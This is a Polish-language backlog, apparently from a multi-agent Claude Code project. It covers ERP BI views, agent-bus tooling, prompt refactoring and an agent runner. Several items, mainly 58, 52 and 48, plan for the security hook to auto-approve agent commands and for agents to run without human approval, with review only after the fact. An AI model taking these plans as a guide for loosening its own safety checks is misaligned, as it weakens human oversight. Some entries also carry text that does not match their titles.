- [do zbudowania] sessions.id → backlog.id (nad czym pracował)

## Priorytetyzacja
Faza 1 (mała): CLI `trace_live.py` — live view w terminalu podczas sesji
Faza 2 (średnia): session-backlog tagging — połączenie sesji z backlogiem
Faza 3 (duża): dashboard Power BI / Streamlit z pełnymi relacjami

### [70] [Dev] Refaktor promptów — sprawdzić negacje starej metody
**area:** Dev  **value:** srednia  **effort:** mala  **status:** done  **created_at:** 2026-03-15

Podczas refaktoru promptów ról sprawdzić czy nie ma reguł negatywnych ("nie rób X", "unikaj Y") które istnieją tylko dlatego że kiedyś była inna wytyczna.

Zasada: zmiana wytycznej = zastąpienie treści, nie zakaz starej metody. Agenci nie mają pamięci — pójdą nową ścieżką bez potrzeby zakazywania starej. Negacje wydłużają prompt bez wartości.

Przejrzeć: CLAUDE.md, ERP_SPECIALIST.md, ANALYST.md, DEVELOPER.md, bi_view_creation_workflow.md.

### [69] [Dev] render.py — strukturyzowany output zamiast dump content
**area:** Dev  **value:** wysoka  **effort:** srednia  **status:** done  **created_at:** 2026-03-15

render.py generuje surową treść pola `content` zamiast strukturyzowanego dokumentu — bezużyteczne jako narzędzie przeglądowe.

Problem: `render.py backlog --format md` dumpa pole content każdego item bez tytułu, id, obszaru, wartości, priorytetu. Wynik nieczytelny, wymaga obejść (Write po Read śmieciowego pliku).

Oczekiwane zachowanie:
- backlog → tabela: id | tytuł | obszar | wartość | praca | status, pogrupowana wg wartość+praca
- suggestions → tabela: id | autor | data | fragment treści (pierwsze 100 znaków)
- inbox → tabela: id | od | do | typ | data | fragment treści
- session-log → lista: data | rola | fragment

Opcjonalnie: --detail <id> → pełna treść jednego rekordu.

Cel: jedno wywołanie CLI → gotowy czytelny plik .md bez żadnego obejścia.

### [68] [Dev] render.py conversation — podgląd ostatnich wiadomości sesji z DB
**area:** Dev  **value:** srednia  **effort:** mala  **status:** done  **created_at:** 2026-03-15

Refleksje Developer — sesja 2026-03-15

1. Workflow jako proza = spaghetti. Refaktor ERP_VIEW_WORKFLOW na checklist + gate pokazał jak dużo można zyskać samą strukturą dokumentu bez zmiany architektury. To wzorzec do zastosowania w pozostałych promptach ról.

2. Wiedza ukryta w solutions/reference/ — agenci nie wiedzieli o obiekty.tsv i numeracja_wzorce.tsv mimo że pliki istniały od 2026-03-11. Dokumenty ról muszą explicite wskazywać gdzie szukać zanim sięgną do bazy lub użytkownika. Sama obecność pliku nie wystarczy.

3. memory vs agent_bus — Claude Code ma wbudowany system memory który agent kojarzy ze słowem "refleksja". Bez jawnego rozróżnienia w prompcie agent idzie w złą stronę. Reguła musi być negatywna: "NIE memory, agent_bus suggest".

4. tmp/tmp.md jako dzielony plik to antypattern. Stara treść leciała do kolejnych operacji. Każda operacja powinna mieć swój plik z opisową nazwą.

5. Komentarz_Usera w planie przyciąga człowieka do weryfikacji kwestii które agenci mogą zamknąć między sobą. Kolumna nazwa sugeruje że ktoś musi wejść. Zmiana nazwy + autonomia ERP Specialist przy zamykaniu = eliminacja niepotrzebnej pętli.

6. Prompty ról to następny duży refaktor (id=63). bi_view_creation_workflow.md jest dowodem że to działa — małe bloki per faza, gate, self-check. Ten wzorzec trzeba przenieść na całą architekturę promptów zanim wejdzie Faza 3 (prompty z DB).

### [67] [Dev] Plan widoku: Komentarz_Usera → Komentarz_Analityka — usunąć angażowanie usera z Fazy 1
**area:** Dev  **value:** wysoka  **effort:** mala  **status:** done  **created_at:** 2026-03-15

Agent ERP Specialist przy poleceniu "dodaj refleksję" użył systemu memory Claude Code zamiast agent_bus_cli.py suggest.

Problem: Claude Code ma wbudowany auto-memory (pliki ~/.claude/memory/) który agent kojarzy ze słowem "refleksja" / "zapamiętaj". Instrukcja w ERP_SPECIALIST.md mówi agent_bus suggest, ale nie rozróżnia explicite od systemu memory.

Fix: w ERP_SPECIALIST.md sekcja "Refleksja po etapie pracy" dodać jawne ostrzeżenie:
Refleksja projektowa = agent_bus_cli.py suggest — NIE system memory Claude Code.
Memory (.claude/memory/) jest dla trwałych preferencji użytkownika między sesjami, nie dla refleksji projektowych.

Dotyczy też ANALYST.md — ten sam wzorzec refleksji.

### [66] [Dev] Refleksja agent — memory vs agent_bus: rozróżnienie w promptach ról
**area:** Dev  **value:** wysoka  **effort:** mala  **status:** done  **created_at:** 2026-03-15

Agent ERP Specialist przy poleceniu "dodaj refleksję" użył systemu memory Claude Code zamiast agent_bus_cli.py suggest.

Problem: Claude Code ma wbudowany auto-memory (pliki ~/.claude/memory/) który agent kojarzy ze słowem "refleksja" / "zapamiętaj". Instrukcja w ERP_SPECIALIST.md mówi agent_bus suggest, ale nie rozróżnia explicite od systemu memory.

Fix: w ERP_SPECIALIST.md sekcja "Refleksja po etapie pracy" dodać jawne ostrzeżenie:
Refleksja projektowa = agent_bus_cli.py suggest — NIE system memory Claude Code.
Memory (.claude/memory/) jest dla trwałych preferencji użytkownika między sesjami, nie dla refleksji projektowych.

Dotyczy też ANALYST.md — ten sam wzorzec refleksji.

### [65] [Dev] tmp/tmp.md — eliminacja dzielonego pliku tymczasowego
**area:** Dev  **value:** srednia  **effort:** mala  **status:** done  **created_at:** 2026-03-15

Problem: tmp/tmp.md jako dzielony plik tymczasowy powoduje błędy:
1. Write wymaga Read przed nadpisaniem — dodatkowy krok, łatwo pominąć
2. Stara treść może polecieć do kolejnej operacji gdy agent zapomni odświeżyć

Opcje:
A) Konwencja unikalnych nazw — każda operacja używa osobnego pliku (tmp/msg_erp_123.md, tmp/backlog_item.md). Prosta reguła, zero narzędzi.
B) Narzędzie tmp_write.py — zapisuje treść do pliku bez wymogu Read. Agent przekazuje treść inline lub przez stdin. Eliminuje problem architektury Write.
C) Reguła w CLAUDE.md — zakaz reużywania tmp/tmp.md między operacjami; każda wiadomość/backlog item = osobny plik z opisową nazwą.

Rekomendacja: C teraz (zero kodu), B jeśli C okaże się niewystarczające.

### [64] [Dev] Git hygiene — scope-aware commit + docelowo git agent
**area:** Dev  **value:** wysoka  **effort:** srednia  **status:** done  **created_at:** 2026-03-15

Problem: agenci używają gita w sposób który powoduje dwa problemy:
1. Przypadkowe commitowanie zmian innych agentów (git add -A zbiera wszystko z working tree)
2. Komendy git wyzwalają hook bezpieczeństwa → człowiek musi zatwierdzać → blokada

Opcje:
A) Rozbudowa git_commit.py (teraz): wymusza --files (jawna lista) lub --scope (np. solutions/bi/TraNag/) zamiast --all bez uzasadnienia. Dodaje --dry-run pokazujący co zostanie scommitowane. Blokuje --all gdy inne role mają niescommitowane zmiany w working tree.

B) Git agent (docelowo): osobna rola jako jedyna która może commitować. Inne role wysyłają "gotowe do commitu: [pliki]" przez agent_bus. Git agent grupuje i commituje z pełną kontrolą. Wymaga runnera (Faza 2).

Rekomendacja: A teraz + B gdy runner gotowy.

### [63] [Arch 3b] Refaktor promptów ról — modularny format (klocki komponowane z DB)
**area:** Arch  **value:** wysoka  **effort:** duza  **status:** deferred  **created_at:** 2026-03-15

Prompty ról (ERP_SPECIALIST.md, ANALYST.md, DEVELOPER.md) są monolityczne — spaghetti. Stary ERP_VIEW_WORKFLOW.md był tego przykładem: reguły zbiorcze, sekcje bez granic, cały dokument w kontekście naraz.

Nowy model (zrealizowany częściowo przez bi_view_creation_workflow.md): prompt = małe, odseparowane klocki które komponują się w całość zależnie od kontekstu.

Cel: przepisać dokumenty ról na modułowy format gotowy do wstrzykiwania z DB (Faza 3).

Zasada: prompt jak kod — małe funkcje, jedna odpowiedzialność, kompozycja przez wywołanie.

Zakres:
1. Zdefiniować taksonomię bloków: rola_statyczna | narzędzia | faza_workflow | gate | zasady_domeny | eskalacja
2. Przepisać ERP_SPECIALIST.md na bloki (rola + narzędzia + per-faza mapping)
3. Przepisać ANALYST.md na bloki
4. Zdefiniować schemat kompozycji per task: session_init dobiera bloki do aktualnego zadania
5. Migracja do DB (tabela prompts) — bloki jako rekordy, session_init ładuje tylko potrzebne

Wymaganie: Faza 3 (prompts w DB, id=53) musi być zrealizowana przed lub równolegle.
Zależność od: bi_view_creation_workflow.md jako wzorzec modułowego dokumentu.

Antywzorce do eliminacji:
- Całość dokumentu roli w każdej sesji niezależnie od zadania
- Reguły domenowe (np. TraNag prefiks) zakopane w środku długiego promptu
- Duplikacja zasad między rolami (np. eskalacja do usera)

Efekt: agent dostaje tylko bloki potrzebne do bieżącej fazy — mniej tokenów, wyższa salience gate'ów.

### [62] [Arch] Analiza transkryptów .jsonl — pipeline wartościowych insightów o pracy agentów
**area:** Arch  **value:** wysoka  **effort:** srednia  **status:** done  **created_at:** 2026-03-15

Transkrypty .jsonl są już zapisywane per sesja (transcript_path w hookach). Zawierają pełną historię: tool_use, tool_result, wiadomości, token counts.

Cel: automatyczne przetwarzanie .jsonl → insighty o pracy agentów.

Zakres:
- Parser .jsonl → strukturyzowane dane per sesja (tool calls, role, sekwencje)
- Metryki: co zużywa kontekst (duże Read, długie SQL, pliki workflow), ile iteracji na zadanie, gdzie agenci się blokują
- Wykrywanie wzorców: jakie sekwencje tool calls prowadzą do PASS vs BLOCKED
- Raport per sesja: render.py --session <id> z zakładkami ToolCalls / ContextUsage / Summary
- Długoterminowo: baza danych wzorców → wejście do optymalizacji promptów

Zależność: transcript_path już dostępny z on_stop.py hook. Dane są — brakuje parsera i renderera.

Powiązane: backlog id=57 (render widoku sesji dla człowieka).

### [61] [Dev] Refaktor workflow BI — workflows/ + handoffs/ + format per faza + narzędzia bramkujące
**area:** Dev  **value:** wysoka  **effort:** duza  **status:** done  **created_at:** 2026-03-15

Refaktor workflow BI — nowa architektura dokumentów i promptów

Źródło: research_results_workflow_compliance.md (2026-03-15)

Zakres:
1. Nowe foldery: workflows/ + handoffs/ (obok documents/)
2. workflows/bi_view_creation_workflow.md — przepisany w formacie per faza:
   Inputs / Steps (checklist) / Forbidden actions / Exit gate (PASS|BLOCKED) / Output JSON / Self-check
3. handoffs/bi_view_handoff_schema.md — wspólny kontrakt handoffu (artefakty, status, next_role)
4. agents/erp_specialist.md — cienki (rola + narzędzia + mapowanie do faz workflow)
5. Sekcje zbiorcze (Nazewnictwo, Zasady tłumaczenia, Eskalacja) → inline w odpowiednich fazach

Narzędzia do zbudowania równolegle z refaktorem:
- bi_init_view.py — inicjalizacja (stub draft + progress.md)
- bi_test_draft.py — draft → export w jednym kroku (Faza 2)
- bi_submit_review.py — gate: sprawdza eksport → wysyła do Analityka (PASS lub odmawia)
- solutions_save_view.py — rozszerzenie o sprawdzenie eksportu przed zapisem

Runtime (do Fazy 3 + bufor id=60):
Agent dostaje: dokument roli (cienki) + tylko aktualną fazę z workflow + handoff schema.
Nie wstrzykujemy całego workflow — zakopuje gate'y w środku długiego promptu.

Antywzorce które eliminujemy:
- workflow jako proza → checklist + gate
- reguły w sekcjach zbiorczych → inline per faza
- brak handoff contractu → JSON schema obowiązkowy
- całość dokumentu w promptcie → tylko bieżąca faza (Faza 3)

### [60] [Arch 4b] Agent-bufor — weryfikator faz workflow (gate + dynamiczne prompty)
**area:** Arch  **value:** wysoka  **effort:** srednia  **status:** deferred  **created_at:** 2026-03-15

Agent-bufor (weryfikator faz) — gate między fazami workflow

Idea: lekki agent-weryfikator który:
1. Zna bieżącą fazę zadania (stan w DB per widok/zadanie)
2. Wstrzykuje dynamiczny prompt tylko dla tej fazy (z DB — Faza 3)
3. Sprawdza artefakty wymagane do zamknięcia fazy (eksport istnieje? Analityk zatwierdził?)
4. Blokuje przejście do następnej fazy jeśli warunki niespełnione

Różnica vs PM (Faza 4): PM orkiestruje wiele agentów, bufor pilnuje jednego workflow.
Bufor jest prostszy i rozwiązuje konkretny problem (pomijanie kroków) bez pełnej orkiestracji.

Połączenie z Fazą 3 (dynamiczne prompty):
- Tabela workflow_phases (faza, warunki_wejścia, warunki_wyjścia, prompt_template)
- Bufor odpytuje DB → zwraca prompt dla bieżącej fazy + checklist artefaktów
- Agent dostaje tylko to co potrzebne teraz, nie cały workflow

Przykład dla ERP_VIEW_WORKFLOW:
- Faza 2 prompt = instrukcje SQL + wymóg --export
- Faza 2→3 gate: *_export.xlsx istnieje i jest nowszy niż *_draft.sql
- Faza 3→4 gate: wiadomość do Analityka z ścieżką eksportu + odpowiedź OK

Zależność: Faza 2 (runner) + Faza 3 (prompty w DB). Sensowny jako Faza 4b przed pełnym PM.

### [59] Korekta nazw TIMESTAMP: Data_ -> DataCzas_ w 4 widokach
**area:** ERP  **value:** wysoka  **effort:** mala  **status:** done  **created_at:** 2026-03-15

Korekta nazw kolumn TIMESTAMP w istniejacych widokach BI (Data_ -> DataCzas_).

Nowa konwencja: pola Clarion TIMESTAMP otrzymuja alias DataCzas_XXX (nie Data_XXX).
Decyzja usera, brak raportow Power BI - zmiana bezpieczna.

Widoki do poprawki (9 kolumn w 4 widokach):
- AIBI.ZamNag: 2 kolumny
- AIBI.TwrKarty: 2 kolumny
- AIBI.KntKarty: 3 kolumny
- AIBI.Rezerwacje: 2 kolumny

Zakres per widok: views/*.sql + draft*.sql + catalog.json + commit + CREATE OR ALTER VIEW przez DBA.
TwrGrupy i KntGrupy: juz w trakcie korekty.

### [58] [Arch 6] Odblokowanie agentów — hook smart fallback + tryb autonomiczny
**area:** Arch  **value:** wysoka  **effort:** duza  **status:** done  **created_at:** 2026-03-15

Odblokowanie agentów w wierszu poleceń — bez stałej obecności człowieka

Obecny problem: hook bezpieczeństwa blokuje komendy wymagające zatwierdzenia przez człowieka.
Gdy człowiek jest niedostępny, agent stoi w miejscu. To strukturalna bariera dla autonomicznego
przepływu agentów (runner Fazy 2 jest bezużyteczny jeśli każda sesja może stać na blokadzie).

Cel: hook zamiast blokować zwraca gotową alternatywę lub auto-zatwierdza w kontekście
autonomicznym. Agenci działają bez przerywania w trybie runner; człowiek widzi log po fakcie.

Zakres:
- Analiza jakie komendy są najczęściej blokowane (bash history + hook log)
- Hook "smart fallback": zamiast blokady zwraca bezpieczny odpowiednik (Write zamiast echo)
- Tryb autonomiczny: flaga session-type (human/autonomous) — różne poziomy auto-approve
- Whitelist bezpiecznych wzorców (git status, python tools/*, sql_query.py itp.)

### [57] [Arch 5.2] Render widoku sesji dla człowieka — co agent dostał i co zwrócił
**area:** Arch  **value:** wysoka  **effort:** mala  **status:** deferred  **created_at:** 2026-03-14

Faza 5 narzędzie. render.py rozszerzony o: --session <id> → pełna sesja (conversation + trace + tool calls z .jsonl). Format XLSX: zakładki Conversation / ToolCalls / Summary. Cel: człowiek w 30s rozumie co agent zrobił w sesji i dlaczego.

### [56] [Arch 5.1] Dokumentacja w bazie — tabela docs + render dla agentów
**area:** Arch  **value:** srednia  **effort:** duza  **status:** deferred  **created_at:** 2026-03-14

Faza 5. Tabela docs (path, title, content, section, tags). Migracja documents/ → DB. render.py --doc <path> → MD/HTML. Cel: agent dostaje dokument z DB zamiast z pliku. Pliki .md zostają jako backup. Docelowo: jeden render pokazuje co agent dostaje (prompt + docs + backlog + inbox) — pełna widoczność dla człowieka.

### [55] [Arch 4.1] Project Manager — rola orkiestracji zadań między agentami
**area:** Arch  **value:** srednia  **effort:** duza  **status:** deferred  **created_at:** 2026-03-14

Faza 4. Rola PM: planuje wielowątkowe sesje, monitoruje postęp, zapewnia ciągłość. Narzędzia: odczyt backlog + session_log + conversation, tworzenie tasków do inboxów agentów, raport stanu projektu. Sensowny dopiero po Fazie 2 (runner) — bez invocation PM to tylko czytnik.

### [54] [Arch 3.2] Prompt Engineer — rola do edycji promptów w DB
**area:** Arch  **value:** srednia  **effort:** mala  **status:** deferred  **created_at:** 2026-03-14

Faza 3 rola. Nowy routing w CLAUDE.md: Prompt Engineer. Narzędzia: prompt_get.py, prompt_set.py, prompt_diff.py (wersjonowanie). Pliki chronione znikają — edycja przez rolę, nie przez git. CLAUDE.md staje się minimalny (routing + session_init).

### [53] [Arch 3.1] Prompty w bazie — tabela prompts + migracja dokumentów ról
**area:** Arch  **value:** srednia  **effort:** srednia  **status:** deferred  **created_at:** 2026-03-14

Faza 3. Nowa tabela prompts (role, section, content, version, active). Migracja: pliki .md ról → sekcje w DB (szkielet statyczny + dynamiczne fragmenty: narzędzia, backlog, context). session_init.py ładuje z DB zamiast z pliku. Pliki .md zostają jako fallback i źródło prawdy przy bootstrapie.

### [52] [Arch 2.2] Agent runner — autonomiczny tryb (bez approval gate)
**area:** Arch  **value:** wysoka  **effort:** srednia  **status:** done  **created_at:** 2026-03-14

Faza 2 produkcja. Po walidacji PoC z approval gate — tryb autonomiczny dla zaufanych tasków (np. ERP Specialist → Analityk). Konfigurowalny per-para ról. Mechanizm stop: max N iteracji, timeout, flaga stop_on_error. Monitoring: każde wywołanie logowane do session_log z parent_session_id.

### [51] [Arch 2.1] Agent runner — inbox poller + subprocess wywołanie agenta
**area:** Arch  **value:** wysoka  **effort:** srednia  **status:** done  **created_at:** 2026-03-14

Faza 2 PoC. tools/mrowisko_runner.py: daemon polling inbox (co 60s), dla każdego task uruchamia subprocess Claude Code CLI z treścią zadania. Approval gate: człowiek zatwierdza każde wywołanie zanim runner odpali agenta. Rate limiting: max N agentów równolegle. Guard: agent nie może wywołać roli o wyższych uprawnieniach.

### [50] [Arch 1.3] session_init — ładowanie promptu roli z pliku/DB przez jeden tool call
**area:** Arch  **value:** wysoka  **effort:** mala  **status:** done  **created_at:** 2026-03-14

Faza 1 finalizacja. session_init.py zwraca treść dokumentu roli (Read z pliku lub z DB gdy gotowe). Agent zamiast czytać 3-4 pliki .md — jeden tool call. CLAUDE.md skraca się do: routing + 'wywołaj session_init'. Decyzja: czy używamy Claude Code session_id z hooka zamiast własnego UUID.

### [49] [Arch 1.2] Zapis sesji — on_stop do conversation + render sesji
**area:** Arch  **value:** wysoka  **effort:** mala  **status:** done  **created_at:** 2026-03-14

Faza 1 kontynuacja. on_stop.py zapisuje last_assistant_message do conversation table. Zbadać strukturę .jsonl (ile wierszy, format). render.py --session <id> → MD/XLSX widok pełnej sesji: wiadomości usera, odpowiedzi agenta, tool calls. Cel: człowiek może podejrzeć co agent dostał i co zwrócił.

### [48] Agent-to-agent invocation — mrowisko runner
**area:** Arch  **value:** wysoka  **effort:** srednia  **status:** deferred  **created_at:** 2026-03-14

Runner/daemon czytający inbox i wywołujący agentów autonomicznie (subprocess Claude Code CLI). PoC z manualnym approval gate. Rdzeń mrowiska — prawdziwa autonomia bez człowieka w pętli. Wymagania: rate limiting, guard przed pętlami, security (brak eskalacji uprawnień).

### [47] Zapis konwersacji agentow do bazy (trace)
**area:** Arch  **value:** wysoka  **effort:** mala  **status:** done  **created_at:** 2026-03-14

WYNIKI E1-E3 (2026-03-14): Hook UserPromptSubmit daje session_id (Claude Code UUID) + transcript_path + prompt. Hook Stop daje last_assistant_message + transcript_path. Pełny transkrypt w .jsonl już istnieje. Następne kroki: (1) on_stop.py zapisuje last_assistant_message do conversation, (2) zbadać strukturę .jsonl, (3) zdecydować czy session_init potrzebny czy tylko hook zastępuje jego rolę.

### [46] Widok BI AIBI.KntGrupyDom — grupy domowe kontrahentów
**area:** ERP  **value:** srednia  **effort:** mala  **status:** done  **created_at:** 2026-03-14

Widok BI dla grup domowych kontrahentów CDN.KntGrupyDom. Hierarchia kategorii kontrahentów — 1 rekord per kontrahent (analogicznie do TwrGrupyDom). GIDTyp=-16 definicje grup, GIDTyp=16 przypisania kontrahent-grupa. Prefiks KGD_. Ścieżka rekurencyjna np. KLIENCI\Detaliczni\Warszawa. Wzorzec identyczny z TwrGrupyDom — CTE z TwrKarty do ponownego użycia.

### [45] Dodaj typ 'task' do agent_bus send — rozróżnienie task vs suggestion
**area:** Arch  **value:** srednia  **effort:** mala  **status:** done  **created_at:** 2026-03-14

Komenda send domyślnie wysyła typ 'suggestion'. Zadania do agentów (np. 'zbadaj bug w Rozrachunki') lądują jako suggestion — mylące przy skali.
Proponowane typy: task, suggestion, info, flag_human (obecne).
Zakres: dodać 'task' jako dozwolony typ w agent_bus_cli.py send + agent_bus.py + testy.

### [44] Zaktualizuj MEMORY.md — developer_notes.md i status projektu
**area:** Dev  **value:** srednia  **effort:** mala  **status:** done  **created_at:** 2026-03-14

MEMORY.md ma datę 2026-03-11 i nadal wymienia developer_notes.md jako aktywny kanał.
Zaktualizować: usunąć wzmiankę o developer_notes.md, zaktualizować status projektu (komunikacja agent-agent uruchomiona, 10 widoków BI w backlogu), zaktualizować datę.

### [43] Usuń referencje do developer_notes.md z ERP_SPECIALIST.md i ANALYST.md
**area:** Dev  **value:** wysoka  **effort:** mala  **status:** done  **created_at:** 2026-03-14

developer_notes.md zdeprecjonowany (sesja 2026-03-14) — treść przeniesiona do DB.
ERP_SPECIALIST.md i ANALYST.md nadal mają instrukcję 'czytaj developer_notes.md na starcie'.
Agent trafi na nieistniejący plik — błąd przy każdej sesji ERP Specialist i Analityka.
Zakres: usunąć linię odwołującą się do developer_notes.md z obu plików (pliki chronione — wymaga zatwierdzenia).

### [42] Zasada: odpowiedź proporcjonalna do zadania w komunikacji agent-agent
**area:** Arch  **value:** srednia  **effort:** mala  **status:** done  **created_at:** 2026-03-14

Konwencja odpowiedzi proporcjonalnej do zadania w komunikacji agent-agent.

Obserwacja (ERP Specialist, 2026-03-14): wysłanie pełnego raportu analitycznego jako odpowiedzi
na prosty task marnuje context window obu stron (nadawcy i odbiorcy).

Zasada: odpowiedź proporcjonalna do zadania.
- Krótki task → krótka odpowiedź (kilka zdań)
- Złożona analiza → wyniki do pliku (solutions/ lub dedykowany plik), wiadomość ze wskazaniem lokalizacji

Do wdrożenia: zasada w ERP_SPECIALIST.md lub CLAUDE.md jako reguła komunikacji agent-agent.

### [41] agent_bus_cli: backlog-add-bulk — bulk dodawanie pozycji z pliku JSON
**area:** Dev  **value:** srednia  **effort:** mala  **status:** done  **created_at:** 2026-03-14

Dodać do agent_bus_cli.py komendę backlog-add-bulk przyjmującą plik JSON z listą pozycji. Jedna komenda = jedno zatwierdzenie zamiast N. Wzorzec: python tools/agent_bus_cli.py backlog-add-bulk --file items.json. Format items.json: lista obiektów z polami title, area, value, effort, content.

### [40] Widok BI: KntGrupy — grupy ogolne kontrahentow
**area:** ERP  **value:** srednia  **effort:** mala  **status:** done  **created_at:** 2026-03-14

Widok BI dla grup ogolnych kontrahentow CDN.KntGrupy (wielokrotne przypisania, bridge). KntKarty zawiera juz grupe domowa — ten widok dodaje segmentacje wielogrupowa kontrahentow.

### [39] Widok BI: MagElem — pozycje dokumentow magazynowych
**area:** ERP  **value:** srednia  **effort:** mala  **status:** done  **created_at:** 2026-03-14

Widok BI dla pozycji dokumentow magazynowych CDN.MagElem (WZ/PZ/MM). Szczegol ruchu fizycznego per produkt. Uzupelnienie MagNag.

### [38] Widok BI: MagNag — naglowki dokumentow magazynowych
**area:** ERP  **value:** srednia  **effort:** mala  **status:** done  **created_at:** 2026-03-14

Widok BI dla naglowkow dokumentow magazynowych CDN.MagNag (WZ/PZ/MM). Prefiks MaN_. Ruch fizyczny towaru miedzy magazynami — oddzielny od handlowego.

### [37] Widok BI: TwrGrupy — grupy ogolne towarow
**area:** ERP  **value:** srednia  **effort:** mala  **status:** done  **created_at:** 2026-03-14

Widok BI dla grup ogolnych towarow CDN.TwrGrupy. Wielokrotne przypisania towar-grupa (bridge). Prefiks TwG_. Uzupelnienie TwrGrupyDom dla segmentacji wielowymiarowej.

### [36] Widok BI: TwrZasoby — stany magazynowe
**area:** ERP  **value:** srednia  **effort:** mala  **status:** done  **created_at:** 2026-03-14

Widok BI dla stanow magazynowych CDN.TwrZasoby. Ilosc dostepna i fizyczna per towar per magazyn. Pytania: ile mamy X na magazynie, ktore towary maja zerowy stan.

### [35] Widok BI: ZamElem — pozycje zamowien ZS/ZZ
**area:** ERP  **value:** srednia  **effort:** mala  **status:** done  **created_at:** 2026-03-14

Widok BI dla pozycji zamowien ZS/ZZ CDN.ZamElem. Ilosc, wartosc, termin realizacji per produkt per zamowienie. Laczy z TraNag przez TrN_ZaNNumer. Pytania: co zamowiono a nie zrealizowano, pipeline zamowien.

### [34] Widok BI: TwrGrupyDom — grupy domowe towarow
**area:** ERP  **value:** wysoka  **effort:** mala  **status:** done  **created_at:** 2026-03-14

Widok BI dla grup domowych towarow CDN.TwrGrupyDom. Hierarchia kategorii — 1 rekord per towar (jak KntGrupyDom). TGD_GIDTyp=-16 definicje grup, TGD_GIDTyp=16 przypisania towar-grupa. Prefiks TGD_. Sciezka np. ZAPALNICZKI\Antenka.

### [33] Widok BI: TraElem — pozycje dokumentow handlowych
**area:** ERP  **value:** wysoka  **effort:** mala  **status:** done  **created_at:** 2026-03-14

Widok BI dla pozycji dokumentow handlowych CDN.TraElem (FS/FZ/PA/WZ/PZ). Ilosc, wartosc, rabat per produkt per dokument. Odpowiada na pytania: obrot zapalniczek R/R, sprzedane ilosci per produkt per okres.

### [32] Widok BI: TraNag — naglowki dokumentow handlowych
**area:** ERP  **value:** wysoka  **effort:** mala  **status:** done  **created_at:** 2026-03-14

Widok BI dla naglowkow dokumentow handlowych CDN.TraNag (FS/FZ/PA/WZ/PZ). Fundament analizy obrotu — data, kontrahent, typ dokumentu, wartosc. Odpowiada na pytania: top 5 klientow po obrocie, obroty per miesiac/rok.

### [31] Widok BI: TwrKarty — kartoteka towarowa
**area:** ERP  **value:** wysoka  **effort:** mala  **status:** done  **created_at:** 2026-03-14

Widok BI dla kartoteki towarowej CDN.TwrKarty.

### [30] Zasada: ręczna operacja na pliku = sygnał dla narzędzia
**area:** Dev  **value:** srednia  **effort:** mala  **status:** done  **created_at:** 2026-03-14

Zasada: ręczna operacja na strukturze pliku = sygnał dla narzędzia.

Źródło: sugestia metodologa sesja 2026-03-10 (id=4).
Wdrożenie: dodać do DEVELOPER.md (lub METHODOLOGY.md) jako zasadę.
Pytanie diagnostyczne dla agenta: "Czy to co właśnie robię manualnie mogłoby być jednym wywołaniem CLI?"
Powiązane: zasada "zbadaj strukturę przed budowaniem" (już w DEVELOPER.md). Rozszerza ją o sygnał do budowy narzędzia.
Uzasadnienie: bi_catalog_add.py narodził się z tej obserwacji — wzorzec jest realny i powtarzalny.

### [29] Posprzątać tmp_* z rootu projektu
**area:** Dev  **value:** niska  **effort:** mala  **status:** done  **created_at:** 2026-03-14

Posprzątać pliki tmp_* z rootu projektu.

Źródło: refleksja developera sesja 2026-03-13 (id=11).
Pliki do usunięcia: tmp_areas.py, tmp_backlog.md, tmp_render.py, tmp_seed.py (widoczne w git status jako untracked).
Mała praca, utrzymuje czystość repo.

### [28] Zastąpić changes_propositions.md dokumentem architektonicznym per feature
**area:** Dev  **value:** srednia  **effort:** mala  **status:** done  **created_at:** 2026-03-14

Zastąpić changes_propositions.md dokumentem architektonicznym per feature.

Źródło: refleksja developera sesja 2026-03-13 (id=11).
Wdrożenie: zaktualizować DEVELOPER.md — usunąć odwołania do changes_propositions.md, zastąpić wzorcem "dokument architektoniczny per feature" (np. agent_bus_faza15.md).
Uzasadnienie: changes_propositions.md to przeżytek — user potwierdził. Dokument per feature jest czytelniejszy i łatwiejszy do przeglądu.

### [27] Zasada: narzędzie od razu w tools/ z testami, nie łatka w root
**area:** Dev  **value:** wysoka  **effort:** mala  **status:** done  **created_at:** 2026-03-14

Zasada: każde narzędzie od razu w tools/ z testami — nie jako łatka w root projektu.

Źródło: refleksja developera sesja 2026-03-13 (id=11).
Wdrożenie: dodać regułę do DEVELOPER.md sekcja CODE QUALITY STANDARDS lub Phase 3.
Uzasadnienie: tmp_render.py jako łatka bez testów — złapane przez usera. Plik roboczy bez testów to dług który wraca.

### [26] agent_bus_server — HTTP API dla rendererow (model B)
**area:** Arch  **value:** wysoka  **effort:** srednia  **status:** done  **created_at:** 2026-03-13

### [Arch] agent_bus_server — lokalny HTTP API dla mrowisko.db

**Źródło:** decyzja architektoniczna 2026-03-13 (zastępuje generate_view id=15)
**Wartość:** wysoka
**Pracochłonność:** średnia

Zasada: API first. Renderery (.md, .xlsx, web, AR) konsumują JSON — nie DB bezpośrednio.
Agent używa CLI (model B). Serwer to narzędzie dla człowieka — uruchamiane na żądanie.

Stack: FastAPI + uvicorn.

Endpointy v1:
- GET /backlog?status=&area=
- GET /suggestions?status=&author=
- GET /inbox?role=
- GET /session-log?role=&limit=
- GET /messages?recipient=&status=

Plik: tools/agent_bus_server.py
Uruchomienie: python tools/agent_bus_server.py (localhost:8765)

Renderery jako osobne skrypty konsumujące JSON z serwera:
- render_md.py → pliki .md
- render_xlsx.py → Excel
- (przyszłość) web app, AR overlay

Agent nie zależy od serwera — używa agent_bus_cli.py bezpośrednio.

### [25] agent_bus_server — lokalny HTTP API dla mrowisko.db
**area:** Arch  **value:** wysoka  **effort:** srednia  **status:** cancelled  **created_at:** 2026-03-13

### [Arch] agent_bus_server — lokalny HTTP API dla mrowisko.db

**Źródło:** decyzja architektoniczna 2026-03-13 (zastępuje generate_view id=15)
**Wartość:** wysoka
**Pracochłonność:** średnia

Zasada: API first. mrowisko.db ma jeden interfejs danych — lokalny HTTP serwer.
Renderery (.md, .xlsx, web, AR) konsumują API, nie DB bezpośrednio.

Stack: FastAPI + uvicorn (async-ready, auto-docs pod /docs, zero konfiguracji lokalnie).

Endpointy v1:
- GET /backlog?status=&area=
- GET /suggestions?status=&author=
- GET /inbox?role=
- GET /session-log?role=&limit=
- GET /messages?recipient=&status=

Plik: tools/agent_bus_server.py
Uruchomienie: python tools/agent_bus_server.py (domyślnie localhost:8765)

Skalowalność: ten sam serwer jutro obsługuje web app, pojutrze AR overlay dla
człowieka nadzorującego mrowisko. Renderer to klient — nie część serwera.

Zależność: brak. Można zacząć niezależnie od innych zadań.

### [24] Hook blokuje komendy z newline mimo Bash(python:*) w settings
**area:** Dev  **value:** srednia  **effort:** mala  **status:** done  **created_at:** 2026-03-13

### [Dev] Hook blokuje komendy z newline mimo Bash(python:*) w settings

